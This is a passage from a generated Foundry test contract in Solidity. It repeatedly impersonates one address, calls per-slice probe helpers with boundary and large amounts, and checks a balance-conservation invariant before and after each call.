        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_0_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_0(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(0, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(1424));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(1425));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_1_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_1(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(1, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(1424));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(1425));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_2_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_2(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(2, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(1424));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(1425));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_3_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_3(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(3, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(256));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(257));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_4_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_4(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(4, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(10));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(11));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_5_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_5(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(5, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(10));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(11));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_6_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_6(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(6, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w0() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(1000000000000000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w1() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(256));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w2() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(257));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w3() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(150785468876481092525636));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w4() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(376963672191202731314091));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }

    function test_slice_7_w5() public {
        ConservationSnap memory snapBefore = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        uint256 gasStart = gasleft();
        vm.startPrank(0xAD71fF296c9A76501A00F96d25c83c59547B9a28, 0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _probe_slice_7(uint256(1000000));
        vm.stopPrank();
        uint256 gasUsed = gasStart > gasleft() ? (gasStart - gasleft()) : 21000;
        ConservationSnap memory snapAfter = _takeSnap(0xAD71fF296c9A76501A00F96d25c83c59547B9a28);
        _assertConservation(7, snapBefore, snapAfter, gasUsed);
    }
}
